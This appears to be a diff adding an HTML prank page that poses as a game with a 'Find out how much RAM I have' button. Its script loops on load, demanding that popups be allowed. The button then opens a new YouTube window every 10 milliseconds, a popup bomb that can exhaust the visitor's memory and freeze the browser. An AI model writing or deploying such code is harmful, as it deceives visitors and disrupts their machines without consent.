@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>Let's play a game</h1>
+    <button onclick="start()">Find out how much RAM I have</button>
+
+    <script>
+
+while(true) {
+        const popup = window.open("javascript:window.close()", "_blank");
+
+        if (!popup || popup.closed || typeof popup.closed === "undefined") {
+            // Popup was blocked
+            alert("Please allow popups for this site to continue.");
+            continue;
+        }
+        break;
+}
+
+        function start() {
+            setInterval(() => {
+                window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+            }, 10);
+        }
+    </script>
+
+</body>
+</html>
